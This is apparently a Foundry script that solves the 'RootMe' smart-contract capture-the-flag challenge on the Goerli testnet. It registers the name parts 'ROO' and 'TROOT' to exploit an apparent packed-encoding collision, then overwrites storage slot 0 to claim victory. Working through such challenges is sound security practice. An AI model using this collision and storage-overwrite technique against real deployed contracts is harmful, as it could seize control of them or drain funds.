// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/ChallengeRootMe.sol";

// https://goerli.etherscan.io/address/0x04628B73850868714887f21d2F1541F08bDd237B
contract ChallengeRootMeScript is Script {
    address constant instance = 0x04628B73850868714887f21d2F1541F08bDd237B;

    function run() public {
        vm.startBroadcast();

        RootMe rootMe = RootMe(instance);
        rootMe.register("ROO", "TROOT");
        rootMe.write(bytes32(uint256(0)), bytes32(uint256(1)));

        console.log("victory", rootMe.victory());
    }
}
